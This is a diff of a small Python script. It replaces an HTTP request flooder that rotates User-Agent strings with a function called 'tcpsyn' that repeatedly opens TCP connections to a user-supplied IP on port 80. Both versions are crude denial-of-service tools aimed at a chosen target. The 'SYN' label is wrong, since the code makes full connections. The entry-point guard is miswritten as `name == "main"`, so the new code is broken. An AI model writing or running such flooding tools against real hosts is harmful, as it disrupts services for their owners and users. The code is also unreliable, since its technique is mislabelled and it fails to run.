@@ -1,22 +1,25 @@
+import socket
 
+def tcpsyn(target_ip, target_port, num_requests):
+    try:
+        target_ip = socket.gethostbyname(target_ip)
+    except socket.gaierror:
+        print("Invalid IP address")
+        return
 
-import requests
-import random
-
-def send_requests(url, num_requests):
     for _ in range(num_requests):
-        headers = {'User-Agent': generate_user_agent()}
-        requests.get(url, headers=headers)
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(2)
+            s.connect((target_ip, target_port))
+            print(f"Sending SYN request to {target_ip}:{target_port}")
+            s.close()
+        except (socket.error, socket.timeout):
+            print(f"Failed to send SYN request to {target_ip}:{target_port}")
 
-def generate_user_agent():
-    user_agents = [
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
-        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.3',
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.3',
-    ]
-    return random.choice(user_agents)
-
-URL = input(" Enter Url: ")
-NUM_REQUESTS = int(input(" Enter Req's Amount: "))
-
-send_requests(URL, NUM_REQUESTS)
+if name == "main":
+    target_ip = input("Enter the target IP address: ")
+    target_port = 80
+    num_requests = int(input("Enter the number of requests: "))
+    
+    tcpsyn(target_ip, target_port, num_requests)
